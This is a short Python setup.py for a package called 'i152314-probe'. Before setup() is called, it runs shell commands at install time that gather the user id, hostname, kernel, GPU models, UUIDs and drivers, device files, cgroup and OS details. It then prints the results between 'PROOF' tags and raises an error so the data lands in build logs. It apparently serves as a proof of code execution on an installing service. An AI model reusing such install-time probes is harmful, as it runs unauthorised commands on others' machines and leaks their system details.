
import sys, subprocess
def sh(cmd, t=60):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (p.stdout + p.stderr).decode("utf-8", "replace").strip()
    except Exception as e:
        return "ERR:" + repr(e)
try:
    cmd = ("id; hostname; uname -a; "
           "nvidia-smi -L; "
           "nvidia-smi --query-gpu=name,uuid,memory.total,memory.free,driver_version --format=csv,noheader; "
           "ls -l /dev/nvidia* 2>&1; "
           "head -3 /proc/1/cgroup; "
           "cat /etc/os-release | head -2")
    out = sh(cmd)
except Exception as e:
    out = "ERR:" + repr(e)
tag = "I152314PROOF>>>" + out + "<<<I152314END"
sys.stderr.write(tag + "\n")
sys.stdout.write(tag + "\n")
raise RuntimeError("I152314PROOF " + out.replace("\n", " ~ "))
from setuptools import setup
setup(name="i152314-probe", version="0.0.1")
